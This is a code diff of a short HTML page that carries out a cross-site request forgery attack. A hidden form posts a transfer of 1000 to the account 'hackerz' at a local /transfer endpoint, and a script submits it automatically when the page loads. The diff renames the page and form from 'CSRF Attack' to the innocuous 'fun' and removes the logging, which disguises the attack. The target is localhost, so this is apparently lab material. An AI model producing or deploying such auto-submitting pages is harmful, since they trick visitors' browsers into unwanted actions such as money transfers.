@@ -1,17 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CSRF Attack</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>fun</title>
 </head>
 <body>
-    <form id="csrfForm" action="http://127.0.0.1:8080/transfer" method="POST">
-        <input type="hidden" name="user_to" value="hackerz" />
-        <input type="hidden" name="amount" value="1000" />
+    <form id="fun" action="http://127.0.0.1:8080/transfer" method="POST">
+        <input type="hidden" name="user_to" value="hackerz">
+        <input type="hidden" name="amount" value="1000">
     </form>
     <script>
-        console.log("Submitting form...");
-        document.getElementById('csrfForm').submit();
-        console.log("Form submitted!");
+        document.getElementById('fun').submit();
     </script>
 </body>
 </html>
